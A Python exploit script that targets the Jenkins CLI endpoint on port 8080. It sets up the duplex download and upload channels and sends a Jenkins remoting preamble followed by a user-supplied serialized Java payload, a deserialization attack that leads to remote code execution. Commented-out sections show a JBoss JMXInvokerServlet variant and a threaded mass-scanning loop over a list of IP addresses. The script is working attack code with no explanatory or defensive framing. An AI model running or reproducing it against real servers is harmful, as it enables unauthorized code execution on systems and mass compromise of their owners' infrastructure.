import requests
import sys
import queue
import threading
import time
import uuid

class test():
	# def __init__(self):
	# def post(self,ip):
	# 	with open(self.file,mode='rb') as f:
	# 		file=f.read()
	# 	target='http://'+ip+':8080'+'/invoker/JMXInvokerServlet'
	# 	print(target)
	# 	r=requests.post(target,data=file)
	# 	print(r.content)
	# PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
	# PROTO = b'\x00\x00\x00\x00'

	def download(self,ip,session):
		target='http://'+ip.rstrip('/')+':8080'+'/cli'
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		print(target)
		headers = {'Side' : 'download'}
		headers['Content-type'] = 'application/x-www-form-urlencoded'
		headers['Session'] = session
		headers['Transfer-Encoding'] = 'chunked'
		r=requests.post(target,data=' ',headers=headers,stream=True, verify=False)
		print(r.content)

	# def null_payload(self):
	# 	yield b" "
	def upload(self,ip,session,data):
		target='http://'+ip.rstrip('/')+':8080'+'/cli'
		# with open(self.file,mode='rb') as f:
		# 	file=f.read()
		headers = {'Side' : 'upload'}
		headers['Session'] = session
		headers['Content-type'] = 'application/octet-stream'
		headers['Accept-Encoding'] = None
		headers['Transfer-Encoding'] = 'chunked'
		headers['Cache-Control'] = 'no-cache'
		r=requests.post(target,data=data,headers=headers,stream=True, verify=False)



	def worker(self,q):
		while not q.empty():
			ip=q.get()
			try:
				self.post(ip)
			finally:
				q.task_done()


if __name__ == '__main__':
	# print("Example: python ip.txt 1.ser")
	# if len(sys.argv)!=3:
	# 	print("format wrong")
	# 	sys.exit()


	# q=queue.Queue()
	PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
	PROTO = b'\x00\x00\x00\x00'
	session = str(uuid.uuid4())
	a=test()
	with open(sys.argv[2],mode='rb') as f:
		file=f.read()
	ip=sys.argv[1]
	print('download')
	t = threading.Thread(target=a.download, args=(ip, session))
	t.start()
	# a.download(ip,session)
	time.sleep(2)
	print('upload')

	def create_payload_chunked():
		yield PREAMLE
		yield PROTO
		yield file
	# data=PREAMLE+PROTO+file

	a.upload(ip,session,create_payload_chunked())


	# file=sys.argv[2]
	# iplist=[]
	# with open(ip,mode='rb') as ipf:
	# 	for line in ipf.readlines():
	# 		# print(line.decode('utf-8'))
	# 		q.put(line.decode('utf-8'))
	# 		# iplist.append(line.decode('utf-8'))
	# threads=[threading.Thread(target=a.worker,args=(q,)) for i in range(200)]
	# list(map(lambda x:x.start(),threads))
	# q.join()
	print("scan over")
	# while not q.empty():
	# 		print(q.get())

		# print(str(ipf.readline()))
		# while q.put(ipf.readline())!=None:
		# 	print (q.get())

	# a=test(ip,file)
	# a.post()